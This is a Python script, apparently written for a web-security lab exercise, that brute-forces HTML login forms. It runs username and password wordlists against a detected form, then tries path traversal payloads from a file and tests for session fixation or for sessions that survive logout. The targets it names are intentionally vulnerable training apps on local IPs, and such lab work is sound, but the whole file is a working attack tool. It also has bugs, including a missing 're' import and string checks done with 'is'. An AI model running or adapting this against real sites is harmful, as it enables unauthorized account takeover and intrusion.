import requests
from robobrowser import RoboBrowser
from bs4 import BeautifulSoup
from urllib.error import *
from general import *

# hanya bisa digunakan pada halaman login biasa
# belum ada kondisi jika login berhasil, untuk sementara asumsi berhasil login jika mendapat cookies PHPSESSID

class BruteForce:

    def __init__(self, alamatURL):
        self.alamatURL = alamatURL
        self.user_list = "user_list.txt"
        self.pass_list = "pass_list.txt"
        self.list_atr = ("id", "class", "name", "action")
        self.atr_form = None
        self.atr_value = None

        self.user = file_to_set(self.user_list)
        self.pswrd = file_to_set(self.pass_list)

        #try:
        self.boot()
        try:
           pass
        except HTTPError as e:
            self.text.insertPlainText("Error code : " + e.code + e.reason)
            print("Error code :", e.code, e.reason)
        except URLError as e:
            print("Check your internet connection : ", e.reason)
            self.text.insertPlainText("Periksa koneksi internet anda : " + e.reason)
        except ConnectionError as e:
            print("Error : ", e)
            self.text.insertPlainText("Error : " + e)
        except Exception as e:
            print("The site cannot be reached")



        # print(self.value_tag, self.tag_form, self.name_input)

    def boot(self):
        self.htmlLogin = get_form_login_html(self.alamatURL)

        if self.htmlLogin is not None:
            self.name_input = get_input_name(self.htmlLogin)

            value = None
            for atr in self.list_atr:
                value = get_value_atr_form(self.htmlLogin, atr)
                if value is not None:
                    self.atr_form = atr
                    self.atr_value = value
                    self.attack()
                    break
            if value is None:
                return print("Tidak Menemukan atr Form")

    def attack(self):
        hdr = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
            'Accept-Encoding': 'none',
            'Accept-Language': 'en-US,en;q=0.8',
            'Connection': 'keep-alive'}
        s = requests.Session()
        s.headers = hdr
        b = RoboBrowser(history=True)
        b.open(self.alamatURL)
        if self.atr_form is "id":
            #print("masuk id")
            form = b.get_form(id=self.atr_value)
        elif self.atr_form is "class":
            #print("masuk class")
            form = b.get_form(class_=self.atr_value)
        elif self.atr_form is "name":
            #print("masuk name")
            form = b.get_form(name=self.atr_value)
        elif self.atr_form is "action":
            #print("masuk action")
            form = b.get_form(action=self.atr_value)
        else:
            return print("error di form")

        #melakukan input salah sebagai kondisi gagal login saat melakukan Brute Force
        form[self.name_input[0]].value = "xxxxx"
        form[self.name_input[1]].value = "yyyyy"
        b.submit_form(form)
        urlFailed = str(b.url)
        print("URL Failed login is " + urlFailed)
        if urlFailed.__contains__("xxxxx") or urlFailed.__contains__("yyyyy"):
            print("URL contain parmeter id or password")


        #melakukan serangan Brute

        for username in self.user:
            for password in self.pswrd:
                b.open(self.alamatURL)
                print(username)
                print(password)
                print("----------")
                form[self.name_input[0]].value = username
                form[self.name_input[1]].value = password
                b.submit_form(form)
                url = str(b.url)
                if url != urlFailed:
                    print("login is success or you has been locked out of attempts")
                    print("Url      : " + b.url)
                    print("Username : " + username)
                    print("Password : " + password)

                    # melakukan cek apakah url setelah login url memiliki parameter
                    # jika iya maka mencoba melakukan serangan traversal path
                    if cek_link_with_parm(b.url) is True:
                        print(b.url + "maybe have vulnerability")

                        linkBerhasil = list()
                        split = re.split("([^\?]+)(\?.*=)", str(b.url))
                        listTrav = file_to_set("list_PaTrav_attack.txt")
                        for a in listTrav:
                            cek = b.open(split[1] + a)
                            if cek == 200:
                                linkBerhasil.append(split[1] + a)

                    try:
                        #mencari SESSION PHPSESSID
                        sess = b.session.cookies['PHPSESSID']
                        print("fixation attack")

                        #mencoba logout dan kembali
                        urlLog = b.url
                        print(urlLog)
                        linkLogout = b.get_link(text="logout")
                        if linkLogout is not None:
                            b.follow_link(linkLogout)
                            print(b.url)
                            b.back(n=1)
                            print(b.url)
                            #print(b.parsed)
                            if b.url == urlLog:
                                print("vulnerabilty session not destroyed")
                            else:
                                print("Session is destroyed")
                        else:
                            print("can not find link logout")
                    except:
                        print("can not find PHPSESSID")
                    return None
        return print("login not successfull")


def get_value_atr_form(html, atr):
    soup = BeautifulSoup(html, 'html.parser')
    value = soup.find('form').get(atr)
    return value


def get_input_name(html):
    soup = BeautifulSoup(html, 'html.parser')
    value = list()
    for item in soup.find_all('input'):
        try:
            value.append(item['name'])
        except:
            pass
    return value


#Mencari form login
def get_form_login_html(alamatURL):
    r = requests.get(alamatURL, timeout=5)
    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        all_form = soup.find_all('form')
        for form in all_form:
            html = str(form)
            #print(html)
            if html.__contains__('Login'):
                return html
            elif html.__contains__('signin'):
                return html
            elif html.__contains__('login'):
                return html
            else:
                print("Tidak menemukan Form Login")
                return None
    except:
        print("Tidak menemukan Form Login")
        return None



#BruteForce("http://192.168.10.109/1142014131/login")
print("-" * 60)
#BruteForce("http://192.168.10.109/bWAPP/ba_pwd_attacks_1.php")
print("-" * 60)
#BruteForce("http://192.168.10.109/peruggia/index.php?action=login")
print("-" * 60)
#BruteForce("http://192.168.10.109/WackoPicko/users/login.php")

BruteForce("http://192.168.10.13/login.php")
